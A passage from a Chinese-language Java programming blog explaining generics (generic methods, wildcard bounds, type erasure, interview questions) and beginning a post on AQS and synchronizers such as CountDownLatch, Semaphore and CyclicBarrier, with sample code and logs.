container.getKey(); return test; &#125; //这也不是一个泛型方法，这就是一个普通的方法，只是使用了Generic&lt;Number&gt;这个泛型类做形参而已。 public void showKeyValue1(Generic&lt;Number&gt; obj)&#123; Log.d("泛型测试","key value is " + obj.getKey()); &#125; //这也不是一个泛型方法，这也是一个普通的方法，只不过使用了泛型通配符? //同时这也印证了泛型通配符章节所描述的，?是一种类型实参，可以看做为Number等所有类的父类 public void showKeyValue2(Generic&lt;?&gt; obj)&#123; Log.d("泛型测试","key value is " + obj.getKey()); &#125; /** * 这个方法是有问题的，编译器会为我们提示错误信息："UnKnown class 'E' " * 虽然我们声明了&lt;T&gt;,也表明了这是一个可以处理泛型的类型的泛型方法。 * 但是只声明了泛型类型T，并未声明泛型类型E，因此编译器并不知道该如何处理E这个类型。 public &lt;T&gt; T showKeyName(Generic&lt;E&gt; container)&#123; ... &#125; */ /** * 这个方法也是有问题的，编译器会为我们提示错误信息："UnKnown class 'T' " * 对于编译器来说T这个类型并未项目中声明过，因此编译也不知道该如何编译这个类。 * 所以这也不是一个正确的泛型方法声明。 public void showkey(T genericObj)&#123; &#125; */ //在泛型类中声明了一个泛型方法，使用泛型E，这种泛型E可以为任意类型。可以类型与T相同，也可以不同。 //由于泛型方法在声明的时候会声明泛型&lt;E&gt;，因此即使在泛型类中并未声明泛型，编译器也能够正确识别泛型方法中识别的泛型。 public &lt;E&gt; void show_3(E t)&#123; System.out.println(t.toString()); &#125; //在泛型类中声明了一个泛型方法，使用泛型T，注意这个T是一种全新的类型，可以与泛型类中声明的T不是同一种类型。 public &lt;T&gt; void show_2(T t)&#123; System.out.println(t.toString()); &#125; public static void main(String[] args) &#123; &#125;&#125; 3.5 泛型方法与可变参数12345public &lt;T&gt; void printMsg( T... args)&#123; for(T t : args)&#123; Log.d("泛型测试","t is " + t); &#125;&#125; 1printMsg("111",222,"aaaa","2323.4",55.55); 3.6 静态方法与泛型如果静态方法要使用泛型的话，必须将静态方法也定义成泛型方法 。 1234567891011public class StaticGenerator&lt;T&gt; &#123; /** * 如果在类中定义使用泛型的静态方法，需要添加额外的泛型声明（将这个方法定义成泛型方法） * 即使静态方法要使用泛型类中已经声明过的泛型也不可以。 * 如：public static void show(T t)&#123;..&#125;,此时编译器会提示错误信息： "StaticGenerator cannot be refrenced from static context" */ public static &lt;T&gt; void show(T t)&#123; &#125;&#125; 3.7 泛型方法总结无论何时，如果你能做到，你就该尽量使用泛型方法。也就是说，如果使用泛型方法将整个类泛型化，那么就应该使用泛型方法。另外对于一个static的方法而言，无法访问泛型类型的参数。所以如果static方法要使用泛型能力，就必须使其成为泛型方法。 4. 泛型上下边界我们再来讨论讨论通配符。 通配符有2种： 无边界通配符，用&lt;?&gt;表示。 有边界通配符，用&lt;? extends Object&gt;或者&lt;? super extends Object&gt;来表示。（Object仅仅是一个示例） 无边界123List&lt;?&gt; list = new ArrayList&lt;String&gt;(); // 合法List&lt;?&gt; list = new ArrayList&lt;?&gt;(); // 不合法List&lt;String&gt; list = new ArrayList&lt;?&gt;(); // 不合法 对于带有通配符的引用变量，是不能调用具有与泛型参数有关的方法的。 1234List&lt;?&gt; list = new ArrayList&lt;String&gt;();list.add(1); // 编译不通过list.get(0); // 编译通过int size = list.size(); // 由于size()方法中不含泛型参数，所以可以在通配符变量中调用 总结起来，无边界通配符主要用做引用，可以调用与泛型参数无关的方法，不能调用参数中包含泛型参数的方法。 有边界在使用泛型的时候，我们还可以为传入的泛型类型实参进行上下边界的限制，如：类型实参只准传入某种类型的父类或某种类型的子类。 上边界通配，用&lt;? extends 类型&gt;表示。其语法为： 1List&lt;? extends 类型1&gt; x = new ArrayList&lt;类型2&gt;(); 其中，类型2就只能是类型1或者是类型1的子类。下面代码验证合法性。 12List&lt;? extends Number&gt; x = new ArrayList&lt;Integer&gt;(); //由于Integer是Number的子类，这是合法的List&lt;? extends Number&gt; x = new ArrayList&lt;String&gt;(); //由于String不是Number的子类，这是不合法的 下边界通配，用&lt;? super 类型&gt;表示。其语法为： 1List&lt;? super 类型1&gt; x = new ArrayList&lt;类型2&gt;(); 其中，类型2就只能是类型1或者是类型1的超类。下面代码有验证合法性。 12List&lt;? super Integer&gt; x = new ArrayList&lt;Number&gt;(); //由于Number是Integer的超类，这是合法的List&lt;? super Integer&gt; x = new ArrayList&lt;String&gt;(); //由于String不是Integer的超类，这是不合法的 那么到底什么时候使用下边界通配，什么时候使用上边界通配呢？首先考虑一下怎样才能保证不会发生运行时异常，这是泛型要解决的首要问题，通过前面的内容可以看到，任何可能导致类型转换异常的操作都无法编译通过。 上边界通配：可以保证存放的实际对象至多是上边界指定的类型，那么在读取对象时，我们总是可以放心地将对象赋予上边界类型的引用。 1234List&lt;Integer&gt; list1 = new ArrayList&lt;Integer&gt;();list1.add(1);List&lt;? extends Number&gt; list2 = list1;Number a = list2.get(0); // 编译通过 下边界通配：可以保证存放的实际对象至少是下边界指定的类型，那么在存入对象时，我们总是可以放心地将上边界类型的对象存入泛型对象中。 123List&lt;? super Integer&gt; list3 = new ArrayList&lt;Number&gt;();list3.add(1);list3.add(2); 总结： 如果你想从一个数据类型里获取数据，使用 ? extends 通配符。 如果你想把对象写入一个数据结构里，使用 ? super 通配符。 如果你既想存，又想取，那就别用通配符。 对于泛型方法添加上下边界： 1234567//在泛型方法中添加上下边界限制的时候，必须在权限声明与返回值之间的&lt;T&gt;上添加上下边界，即在泛型声明的时候添加//public &lt;T&gt; T showKeyName(Generic&lt;T extends Number&gt; container)，编译器会报错："Unexpected bound"public &lt;T extends Number&gt; T showKeyName(Generic&lt;T&gt; container)&#123; System.out.println("container key :" + container.getKey()); T test = container.getKey(); return test;&#125; 假定我们有个需求，需要编写一个获取两个对象中较大的对象的泛型方法，利用上面的泛型知识，编写出下面的代码。 1234567public &lt;T&gt; T getMax(T t1, T t2) &#123; if (t1.compareTo(t2) &gt; 1) &#123; // 编译错误 return t1; &#125; else &#123; return t2; &#125;&#125; 在上面的代码无法通过编译，由于我们都没有对类型变量对任何的约束限制，那么实际上这个类型可以是任意Object及其子类。那么在使用这个类型变量时，只能调用Object类中的方法。而Object本身就是Java中对顶层的类，没有实现Comparable接口，所以无法调用compareTo方法来比较对象的大小。这时候可以通过限定类型变量来达到目的。 1234567public &lt;T extends Comparable&lt;T&gt;&gt; T getMax(T t1, T t2) &#123; if (t1.compareTo(t2) &gt; 1) &#123; return t1; &#125; else &#123; return t2; &#125;&#125; 注意到上面的代码使用extends关键字限定了类型变量T必须继承自Comparable，于是变量t1和t2就可以使用Comparable接口中的compareTo方法了。 不管是泛型类、泛型接口还是泛型方法，都可以进行类型限定。类型限定的特点如下： 不管该限定是类还是接口，统一都使用extends关键字。 使用&amp;符号进行多个限定，那么传入的具体类型必须同时是这些类型的子类。 123public &lt;T extends Serializable&amp;Cloneable&amp;Comparable&gt; T getMax(T t1, T t2) &#123; ...&#125; 由于Java中不支持多继承，所以不存在一个同时继承两个以上的类的类。所以，在泛型的限定中，&amp;连接的类型最多只能有一个类，而接口数量则没有限制。同时，如果同时限定类和接口，则必须将类写在最前面。 123public &lt;T extends Object&amp;Serializable&amp;Cloneable&amp;Comparable&gt; T getMax(T t1, T t2) &#123; // 合法 ...&#125; 123public &lt;T extends Object&amp;ArrayList&gt; T getMax(T t1, T t2) &#123; // 同时限定两个类，不合法 ...&#125; 123public &lt;T extends Serializable&amp;Cloneable&amp;Comparable&amp;Object&gt; T getMax(T t1, T t2) &#123; // 将类写在最后面，不合法 ...&#125; 5. 泛型的原理Java中的泛型是伪泛型泛型思想最早在C++语言的模板（Templates）中产生，Java后来也借用了这种思想。虽然思想一致，但是他们存在着本质性的不同。C++中的模板是真正意义上的泛型，在编译时就将不同模板类型参数编译成对应不同的目标代码，ClassName和ClassName是两种不同的类型，这种泛型被称为真正泛型。这种泛型实现方式，会导致类型膨胀，因为要为不同具体参数生成不同的类。 Java中ClassName和ClassName虽然在源代码中属于不同的类，但是编译后的字节码中，他们都被替换成原始类型（ClassName），而两者的原始类型的一样的，所以在运行时环境中，ClassName和ClassName就是同一个类。Java中的泛型是一种特殊的语法糖，通过类型擦除实现（后面介绍），这种泛型称为伪泛型。由于Java中有这么一个障眼法，如果没有进行深入研究，就会在产生莫名其妙的问题。值得一提的是，不少大牛对Java的泛型的实现方式很不满意。 类型擦除Java中的泛型是通过类型擦除来实现的。所谓类型擦除，是指通过类型参数合并，将泛型类型实例关联到同一份字节码上。编译器只为泛型类型生成一份字节码，并将其实例关联到这份字节码上。类型擦除的关键在于从泛型类型中清除类型参数的相关信息，并且再必要的时候添加类型检查和类型转换的方法。 下面通过两个例子来证明在编译时确实发生了类型擦除。 例1分别创建实际类型为String和Integer的ArrayList对象，通过getClass()方法获取两个实例的类，最后判断这个实例的类是相等的，证明两个实例共享同一个类。 1234567// 声明一个具体类型为String的ArrayListArrayList&lt;String&gt; arrayList1 = new ArrayList&lt;String&gt;(); arrayList1.add("abc"); // 声明一个具体类型为Integer的ArrayListArrayList&lt;Integer&gt; arrayList2 = new ArrayList&lt;Integer&gt;(); arrayList2.add(123); System.out.println(arrayList1.getClass() == arrayList2.getClass()); // 结果为true 例2创建一个只能存储Integer的ArrayList对象，在add一个整型数值后，利用反射调用add(Object o) add一个asd字符串，此时运行代码不会报错，运行结果会打印出1和asd两个值。这时再里利用反射调用add(Integer o)方法，运行会抛出codeNoSuchMethodException异常。这充分证明了在编译后，擦除了Integer这个泛型信息，只保留了原始类型。 12345678ArrayList&lt;Integer&gt; arrayList3 = new ArrayList&lt;Integer&gt;();arrayList3.add(1);arrayList3.getClass().getMethod("add", Object.class).invoke(arrayList3, "asd");for (int i = 0; i &lt; arrayList3.size(); i++) &#123; System.out.println(arrayList3.get(i)); // 输出1，asd&#125;arrayList3.getClass().getMethod("add", Integer.class).invoke(arrayList3, 2); // NoSuchMethodException：java.util.ArrayList.add(java.lang.Integer) 自动类型转换上一节上说到了类型擦除，Java编译器会擦除掉泛型信息。那么调用ArrayList的get()最终返回的必然会是一个Object对象，但是我们在源代码并没有写过Object转成Integer的代码，为什么就能“直接”将取出来的对象赋予一个Integer类型的变量呢（如下面的代码第12行）？ 123456789101112import java.util.List;import java.util.ArrayList;/** * 泛型中的类型转换测试。 */public class Test &#123; public static void main(String[] args) &#123; List&lt;Integer&gt; a = new ArrayList&lt;Integer&gt;(); a.add(1); Integer ai = a.get(0); &#125;&#125; 实际上，Java的泛型除了类型擦除之外，还会自动生成checkcast指令进行强制类型转换。上面的代码中的main方法编译后所对应的字节码如下。 1234567891011121314151617181920212223242526public static void main(java.lang.String[]); descriptor: ([Ljava/lang/String;)V flags: ACC_PUBLIC, ACC_STATIC Code: stack=2, locals=3, args_size=1 0: new #2 // class java/util/ArrayList 3: dup 4: invokespecial #3 // Method java/util/ArrayList."&lt;init&gt;":()V 7: astore_1 8: aload_1 9: iconst_1 10: invokestatic #4 // Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer; 13: invokeinterface #5, 2 // InterfaceMethod java/util/List.add:(Ljava/lang/Object;)Z 18: pop 19: aload_1 20: iconst_0 21: invokeinterface #6, 2 // InterfaceMethod java/util/List.get:(I)Ljava/lang/Object; 26: checkcast #7 // class java/lang/Integer 29: astore_2 30: return LineNumberTable: line 7: 0 line 8: 8 line 9: 19 line 10: 30&#125; 看到第18行代码就是将Object类型的对象强制转换为Integer的指令。我们完全可以将上面的代码转换为下面的代码，它所实现的效果跟上面的泛型是一模一样的。既然泛型也需要进行强制转换，所以泛型并不会提供运行时效率，不过可以大大降低编程时的出错概率。 12345public static void main(String[] args) &#123; List a = new ArrayList(); a.add(1); Integer ai = (Integer)a.get(0);&#125; 6. 泛型其他问题泛型与异常 泛型类不能继承Throwable类，所以泛型类的对象既不能捕获也不能抛出。下面的代码是不合法的。 123public class Problem&lt;T&gt; extends Exception &#123; ... &#125; 不能在catch子句中使用泛型变量，譬如： 1234567public static &lt;T extends Throwable&gt; void doSomething(Class&lt;T&gt; t)&#123; try &#123; ... &#125; catch (T e) &#123; //编译错误 ... &#125;&#125; 泛型与基本类型泛型的实际类型必须是引用类型，而不能是基本类型，所以下面的代码都是不合法的。12List&lt;int&gt; list = new ArrayList&lt;int&gt;(); // Syntax error, insert "Dimensions" to complete ReferenceTypeList&lt;byte&gt; list = new ArrayList&lt;byte&gt;(); // Syntax error, insert "Dimensions" to complete ReferenceType 泛型与数组 数组是协变的，而泛型不是。如果Son是Father的子类型，那么Son[]也是Father[]的子类型。而泛型则没有这种关系。 数组是可以具体化的，因此数组只有在运行时才知道其实际的元素类型。如果企图将String保存在Long数组中，会抛出ArrayStoreException异常。相比之下，泛型是通过编译时擦除泛型信息来实现的，因此，泛型只在编译时强化类型信息，并在运行时丢弃类型信息。 上面的不同点导致数组与泛型并不能很好的混合使用 泛型实例化泛型变量是不能被实例化的，这个是笔者在实际开发过程多次遇到过的。 1Object c = new T(); // Cannot instantiate the type T 本意是想实例化一个类型为T的对象，但是这样是无法编译通过的。可以通过上一篇文章中的示例来实现： 123public &lt;T&gt; T getObject(Class&lt;T&gt; t) throws Exception &#123; return t.newInstance();&#125; 泛型与静态方法和静态类泛型类中的静态变量和静态方法都不可以使用泛型类所声明的泛型类型参数，下面的操作是不合法的。 123456public class Test&lt;T&gt; &#123; public static T one; //编译错误 public static T show(T one)&#123; //编译错误 return null; &#125; &#125; 这是由于泛型的具体参数要在实例化是才能确定，而静态变量和静态方法无需实例化就可以调用。当对象都还没有创建时，就调用与泛型变量相关的方法，当然是错误的。不过，对于泛型方法，静态泛型方法是可以的，因为具体的泛型类型无需实例化就可以确定。 7. 面试Java中的泛型是什么 ? 使用泛型的好处是什么?那些拥有Java1.4或更早版本的开发背景的人 都知道，在集合中存储对象并在使用前进行类型转换是多么的不方便。泛型防止了那种情况的发生。它提供了编译期的类型安全，确保你只能把正确类型的对象放入 集合中，避免了在运行时出现ClassCastException。 Java的泛型是如何工作的 ? 什么是类型擦除 ?java编译器是通过先检查代码中泛型的类型，然后再进行类型擦除，再进行编译的。 Java的泛型是伪泛型。为什么说Java的泛型是伪泛型呢？因为，在编译期间，所有的泛型信息都会被擦除掉。正确理解泛型概念的首要前提是理解类型擦除（type erasure）。 如在代码中定义的List&lt;object&gt;和List&lt;String&gt;等类型，在编译后都会编程List。JVM看到的只是List，而由泛型附加的类型信息对JVM来说是不可见的。Java编译器会在编译时尽可能的发现可能出错的地方，但是仍然无法避免在运行时刻出现类型转换异常的情况。 123456789public class Test4 &#123; public static void main(String[] args) throws IllegalArgumentException, SecurityException, IllegalAccessException, InvocationTargetException, NoSuchMethodException &#123; ArrayList&lt;Integer&gt; arrayList3=new ArrayList&lt;Integer&gt;(); arrayList3.add(1);//这样调用add方法只能存储整形，因为泛型类型的实例为Integer arrayList3.getClass().getMethod("add", Object.class).invoke(arrayList3, "asd"); for (int i=0;i&lt;arrayList3.size();i++) &#123; System.out.println(arrayList3.get(i)); &#125; &#125; 在程序中定义了一个ArrayList泛型类型实例化为Integer的对象，如果直接调用add方法，那么只能存储整形的数据。不过当我们利用反射调用add方法的时候，却可以存储字符串。这说明了Integer泛型实例在编译之后被擦除了，只保留了原始类型。 那么，什么是原始类型？原始类型（raw type）就是擦除去了泛型信息，最后在字节码中的类型变量的真正类型。无论何时定义一个泛型类型，相应的原始类型都会被自动地提供。类型变量被擦除（crased），并使用其限定类型（无限定的变量用Object）替换。 123456789class Pair&lt;T&gt; &#123; private T value; public T getValue() &#123; return value; &#125; public void setValue(T value) &#123; this.value = value; &#125; &#125; Pair&lt;T&gt;的原始类型为： 123456789class Pair &#123; private Object value; public Object getValue() &#123; return value; &#125; public void setValue(Object value) &#123; this.value = value; &#125; &#125; 因为在Pair&lt;T&gt;中，T是一个无限定的类型变量，所以用Object替换。其结果就是一个普通的类，如同泛型加入java变成语言之前已经实现的那样。在程序中可以包含不同类型的Pair，如Pair&lt;String&gt;或Pair&lt;Integer&gt;，但是，擦除类型后它们就成为原始的Pair类型了，原始类型都是Object。 从上面的那个例2中，我们也可以明白ArrayList&lt;Integer&gt;被擦除类型后，原始类型也变成了Object，所以通过反射我们就可以存储字符串了。 如果类型变量有限定，那么原始类型就用第一个边界的类型变量来替换。 1public class Pair&lt;T extends Comparable&amp; Serializable&gt; &#123; 那么原始类型就是Comparable。 所以，总结来说：泛型是通过类型擦除来实现的，编译器在编译时擦除了所有类型相关的信息，所以在运行时不存在任何类型相关的信息。例如 List&lt;String&gt;在运行时仅用一个List来表示。这样做的目的，是确保能和Java 5之前的版本开发二进制类库进行兼容。你无法在运行时访问到类型参数，因为编译器已经把泛型类型转换成了原始类型。 什么是泛型中的限定通配符和非限定通配符 ?限定通配符对类型进行了限制。有两种限定通配符，一种是&lt;? extends T&gt;它通过确保类型必须是T的子类来设定类型的上界，另一种是&lt;? super T&gt;它通过确保类型必须是T的父类来设定类型的下界。泛型类型必须用限定内的类型来进行初始化，否则会导致编译错误。另一方面&lt;?&gt;表 示了非限定通配符，因为&lt;?&gt;可以用任意类型来替代。 List&lt;? extends T&gt;和List &lt;? super T&gt;之间有什么区别 ?这两个List的声明都是 限定通配符的例子，List&lt;? extends T&gt;可以接受任何继承自T的类型的List，而List&lt;? super T&gt;可以接受任何T的父类构成的List。例如List&lt;? extends Number&gt;可以接受List&lt;Integer&gt;或List&lt;Float&gt;。 如何编写一个泛型方法，让它能接受泛型参数并返回泛型类型?编写泛型方法并不困难，你需要用泛型类型来替代原始类型，比如使用T, E or K,V等被广泛认可的类型占位符。泛型方法的例子请参阅Java集合类框架。最简单的情况下，一个泛型方法可能会像这样:123public V put(K key, V value) &#123; return cache.put(key, value);&#125; 编写一段泛型程序来实现LRU缓存?LinkedHashMap可以用来实现固定大小的LRU缓存，当LRU缓存已经满 了的时候，它会把最老的键值对移出缓存。LinkedHashMap提供了一个称为removeEldestEntry()的方法，该方法会被put() 和putAll()调用来删除最老的键值对. 你可以把List&lt;String&gt;传递给一个接受List&lt;Object&gt;参数的方法吗？对任何一个不太熟悉泛型的人来说，这个Java泛型题目看起来令人疑惑，因为乍看起来String是一种Object，所以 List&lt;String&gt;应当可以用在需要List&lt;Object&gt;的地方，但是事实并非如此。真这样做的话会导致编译错误。如 果你再深一步考虑，你会发现Java这样做是有意义的，因为List&lt;Object&gt;可以存储任何类型的对象包括String, Integer等等，而List&lt;String&gt;却只能用来存储String。 Array中可以用泛型吗?这可能是Java泛型面试题中最简单的一个了，当然前提是你要知道Array事实上并不支持泛型，这也是为什么Joshua Bloch在Effective Java一书中建议使用List来代替Array，因为List可以提供编译期的类型安全保证，而Array却不能。 如何阻止Java中的类型未检查的警告?如果你把泛型和原始类型混合起来使用，例如下列代码，Java 5的javac编译器会产生类型未检查的警告，例如: 1List&lt;String&gt; rawList = new ArrayList() 注意: Hello.java使用了未检查或称为不安全的操作; 这种警告可以使用@SuppressWarnings(“unchecked”)注解来屏蔽。 Java中List&lt;Object&gt;和原始类型List之间的区别?原始类型和带参数类型 &lt;Object&gt;之间的主要区别是，在编译时编译器不会对原始类型进行类型安全检查，却会对带参数的类型进行检 查，通过使用Object作为类型，可以告知编译器该方法可以接受任何类型的对象，比如String或Integer。这道题的考察点在于对泛型中原始类 型的正确理解。它们之间的第二点区别是，你可以把任何带参数的类型传递给原始类型List，但却不能把List&lt;String&gt;传递给接受 List&lt;Object&gt;的方法，因为会产生编译错误。 Java中List&lt;?&gt;和List&lt;Object&gt;之间的区别是什么?List&lt;?&gt; 是一个未知类型的List，而List&lt;Object&gt; 其实是任意类型的List。你可以把List&lt;String&gt;, List&lt;Integer&gt;赋值给List&lt;?&gt;，却不能把List&lt;String&gt;赋值给 List&lt;Object&gt;. List&lt;String&gt;和原始类型List之间的区别.该题类似于“原始类型和带参数类型之间有什么区别”。带参数类型是类型安全的，而且其类型安全是由编译器保证的，但原始类型List却不是类型安全 的。你不能把String之外的任何其它类型的Object存入String类型的List中，而你可以把任何类型的对象存入原始List中。使用泛型的 带参数类型你不需要进行类型转换，但是对于原始类型，你则需要进行显式的类型转换。 为什么泛型是由类型擦除来实现的?原因是为了向后兼容。所谓的向后兼容，是保证1.5的程序在8.0上还可以运行。（当然指的是二进制兼容，而非源码兼容。）所以本质上是为了让非泛型的java程序在后续支持泛型的jvm上还可以运行。 那么为什么使用类型擦除就能保持向后兼容呢？ 在《java编程思想》中讲到了这样一个例子，下面两种代码在编译成java虚拟机汇编码是一样的，所以无论是函数的返回类型是T，还是你自己主动写强转，最后都是插入一条checkcast语句而已： 以前的写法：123456789101112131415class SimpleHolder&#123; private Object obj; public Object getObj() &#123; return obj; &#125; public void setObj(Object obj) &#123; this.obj = obj; &#125;&#125;SimpleHolder holder = new SimpleHolder();holder.setObj("Item");String s = (String)holder.getObj(); 现在的写法：12345678910111213141516class GenericHolder&lt;T&gt;&#123; private T obj; public T getObj() &#123; return obj; &#125; public void setObj(T obj) &#123; this.obj = obj; &#125;&#125;GenericHolder&lt;String&gt; holder = new GenericHolder&lt;String&gt;();holder.setObj("Item");String s = holder.getObj(); 之前非泛型的写法，编译成的虚拟机汇编码块是A，之后的泛型写法，只是在A的前面，后面“插入”了其它的汇编码，而并不会破坏A这个整体。这才算是既把非泛型“扩展为泛型”，又兼容了非泛型。 类型擦除到底指什么？不要断章取义认为类型擦出就是把容器内对象的类型擦掉了，所谓的类型擦除，是指容器类 List&lt;Integer&gt; ，对于Apple的类型声明在编译期的类型检查之后被擦掉，变为和 List&lt;Object&gt; 等同效果，也可以说是 List&lt;String&gt; 和 List&lt;Integer&gt; 被擦为和 List 等价，而不是指里面的对象本身的类型被擦掉！ 参考http://hinylover.space/2016/06/25/relearn-java-generic-1/ https://blog.csdn.net/s10461/article/details/53941091 https://www.cnblogs.com/rese-t/p/8158870.html]]></content>
      <tags>
        <tag>java基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[6.AQS以及同步组件]]></title>
    <url>%2F2018%2F07%2F21%2F6.AQS%E4%BB%A5%E5%8F%8A%E5%90%8C%E6%AD%A5%E7%BB%84%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[AQS以及同步组件. 1. AQS介绍AQS是JUC的核心。而JUC大大提高了JAVA并发性能。 底层数据结构是一个FIFO队列。 使用Node实现FIFO队列，可以用于构建锁或者其他同步装置的基础框架。 利用了一个int类型表示状态。 使用方法是继承：子类通过继承并通过实现它的方法管理其状态。 可以同时实现排他锁和共享锁模式。在使用者的角度, AQS 的功能分为两类, 独占功能 和共享功能. 它的所有子类中要么实现并使用了它的独占功能API , 要么使用了共享锁的功能 , 不会同时使用两套API 它底层使用的是双向列表 ,是队列的一种实现 , 因此也可以将它当成一种队列 . 其中 Sync queue 是同步列表 ,它是双向列表 , 包括 head ,tail 节点. 其中head 节点主要用来后续的调度 ; Condition queue 是单向链表 , 不是必须的 , 只有当程序中需要Condition 的时候 ,才会存在这个 单向链表 , 并且可能会有多个 Condition queue AQS实现的大致思路：首先 AQS 内部维护了一个 CLH队列来管理锁 , 线程首先会尝试获取锁 , 如果失败, 就将当前线程及等待状态等信息包成一个NODE 节点 加入到 同步队列 (Sync queue)里 , 接着会不断循环尝试获取锁, 它的条件是当前节点为head 的直接后继才会尝试 , 如果失败就会阻塞自己, 直到自己被唤醒,而当持有锁的线程释放锁的时候会唤醒队列中的后继线程 . 2. AQS同步组件2.1 CountDownLatch计数器减到0，处于等待的线程才会继续执行。只能用一次，不能重置。 比如有一个运算量很大的任务，我们可以将它拆分为多个子任务，等所有子任务全部完成之后，再执行最后的汇总工作。 1234567891011121314151617181920212223242526272829303132333435363738@Slf4jpublic class CountdownLatchTest &#123; private static int threadCount = 200; public static void main(String[] args) &#123; ExecutorService exec = Executors.newCachedThreadPool(); final CountDownLatch countDownLatch = new CountDownLatch(threadCount); for(int i=0;i&lt;threadCount;i++)&#123; final int threadNum = i; exec.execute(() -&gt; &#123; try&#123; test(threadNum); &#125;catch (Exception e)&#123; log.error("exection",e); &#125;finally &#123; countDownLatch.countDown(); &#125; &#125;); &#125; try &#123; countDownLatch.await(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; log.info("finish ..."); exec.shutdown(); &#125; private static void test(int threadNum) &#123; log.info("&#123;&#125;",threadNum); try &#123; Thread.sleep(100); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 运行结果，截取了最后一点： 1234567816:34:36.385 [pool-1-thread-90] INFO com.njupt.swg.threadstudyjimin.item07.CountdownLatchTest - 8916:34:36.385 [pool-1-thread-84] INFO com.njupt.swg.threadstudyjimin.item07.CountdownLatchTest - 8316:34:36.385 [pool-1-thread-92] INFO com.njupt.swg.threadstudyjimin.item07.CountdownLatchTest - 9116:34:36.385 [pool-1-thread-94] INFO com.njupt.swg.threadstudyjimin.item07.CountdownLatchTest - 9316:34:36.385 [pool-1-thread-96] INFO com.njupt.swg.threadstudyjimin.item07.CountdownLatchTest - 9516:34:36.385 [pool-1-thread-98] INFO com.njupt.swg.threadstudyjimin.item07.CountdownLatchTest - 9716:34:36.386 [pool-1-thread-100] INFO com.njupt.swg.threadstudyjimin.item07.CountdownLatchTest - 9916:34:36.516 [main] INFO com.njupt.swg.threadstudyjimin.item07.CountdownLatchTest - finish ... 那如果是这种场景呢：计算若干个子任务，给定一个时间，超过这个时间的话，就把这个任务放弃掉。 1countDownLatch.await(10, TimeUnit.MILLISECONDS); 2.2 Semaphore能控制同一时间并发线程的数目 Semaphore实现的功能就类似厕所有5个坑，假如有10个人要上厕所，那么同时只能有多少个人去上厕所呢？同时只能有5个人能够占用，当5个人中 的任何一个人让开后，其中等待的另外5个人中又有一个人可以占用了。另外等待的5个人中可以是随机获得优先机会，也可以是按照先来后到的顺序获得机会，这取决于构造Semaphore对象时传入的参数选项。单个信号量的Semaphore对象可以实现互斥锁的功能，并且可以是由一个线程获得了“锁”，再由另一个线程释放“锁”，这可应用于死锁恢复的一些场合。 1234567891011121314151617181920212223242526272829@Slf4jpublic class SemaphoreLatchTest &#123; private static int threadCount = 20; public static void main(String[] args) &#123; ExecutorService exec = Executors.newCachedThreadPool(); final Semaphore semaphore = new Semaphore(3); for(int i=0;i&lt;threadCount;i++)&#123; final int threadNum = i; exec.execute(() -&gt; &#123; try&#123; semaphore.acquire();//获取一个许可 test(threadNum); semaphore.release();//释放一个许可 &#125;catch (Exception e)&#123; log.error("exection",e); &#125; &#125;); &#125; log.info("finish ..."); exec.shutdown(); &#125; private static void test(int threadNum) throws InterruptedException &#123; Thread.sleep(1000); log.info("&#123;&#125;",threadNum); &#125;&#125; 运行结果是：每秒执行三个线程。这里是一个线程获取一个许可，那么同一时间，可以有三个线程进来一起工作。那如果我改成一个线程获取三个许可呢？就像一个人同时占三个坑位，那么只有等这个人拉完了才能轮到下一个人了，那么此时就变成跟单线程一样了。 123semaphore.acquire(3);test(threadNum);semaphore.release(3); 考虑这个场景：并发太高了，就算是控制线程数量，也比较棘手；一个厕所三个坑位，外面人太多了，让三个人进来，其他的都给轰走。如何做到呢？ 1234if(semaphore.tryAcquire())&#123;//尝试获取一个许可 test(threadNum); semaphore.release();&#125; 输出结果：只有三条信息打印出来，其他的线程就都被丢弃了。 也可以给他一个超时时间，这里是5000毫秒。每个命令需要运行1000毫秒，那么程序等1000毫秒之后会打印三条；然后再等1000毫秒，又可以拿到新的三个许可，再打印三条；直到5000毫秒用完。可能会打印3*5条记录。剩下的5条记录由于已经超时，全部被放弃掉。 上厕所例子：一共三个坑，我给定一个小时，先进来三个人，好了，他们都在10分钟内解决(这里假设最后一个人是正好用了10分钟)，那么这三个坑又可以继续用了，下一批三个人进来用，假设又恰好用了10分钟；那么直到一个小时，有多少人可以上厕所呢？ 1234if(semaphore.tryAcquire(5000, TimeUnit.MILLISECONDS))&#123; test(threadNum); semaphore.release();&#125; 2.3 CyclicBarrier CyclicBarrier也是一个同步辅助类 , 它允许一组线程相互等待 , 直到到达某个公共的屏障点 , 通过它可以完成多个线程之间相互等待 ,只有当每个线程都准备好之后, 才能各自继续往下执行后续的操作, 和 CountDownLatch相似的地方就是, 它也是通过计数器来实现的. 当某个线程调用了 await()方法之后, 该线程就进入了等待状态 . 而且计数器就进行 -1 操作 , 当计数器的值达到了我们设置的初始值0的时候 , 之前调用了await() 方法而进入等待状态的线程会被唤醒继续执行后续的操作. 因为 CyclicBarrier释放线程之后可以重用, 所以又称之为循环屏障 . CyclicBarrier 使用场景和 CountDownLatch 很相似 , 可以用于多线程计算数据, 最后合并计算结果的应用场景 . 两者的区别： CountDownLatch的计数器只能使用一次 , 而 CyclicBarrier 的计数器可以使用 reset重置 循环使用 CountDownLatch 主要是 1 个 或者 n 个线程需要等待其它线程完成某项操作之后才能继续往下执行 , 其描述的是 1 个 或者 n 个线程与其它线程的关系 ; CyclicBarrier 主要是实现了 1 个或者多个线程之间相互等待,直到所有的线程都满足条件之后, 才执行后续的操作 , 其描述的是内部各个线程相互等待的关系 . CyclicBarrier 假如有 5 个线程都调用了 await() 方法 , 那这个 5 个线程就等着 , 当这 5 个线程都准备好之后, 它们有各自往下继续执行 , 如果这 5 个线程在后续有一个计算发生错误了 , 这里可以重置计数器 , 并让这 5 个线程再执行一遍 . 123456789101112131415161718192021222324252627282930@Slf4jpublic class CyclicBarrierTest &#123; private static CyclicBarrier cyclicBarrier = new CyclicBarrier(3); public static void main(String[] args) throws InterruptedException &#123; ExecutorService exec = Executors.newCachedThreadPool(); for(int i=0;i&lt;6;i++)&#123; Thread.sleep(1000 ); exec.execute(() -&gt; &#123; try&#123; race(); &#125;catch (Exception e)&#123; log.error("exception",e); &#125; &#125;); &#125; exec.shutdown(); &#125; private static void race() throws InterruptedException &#123; Thread.sleep(1000); log.info("ready..."); try &#123; cyclicBarrier.await(); &#125; catch 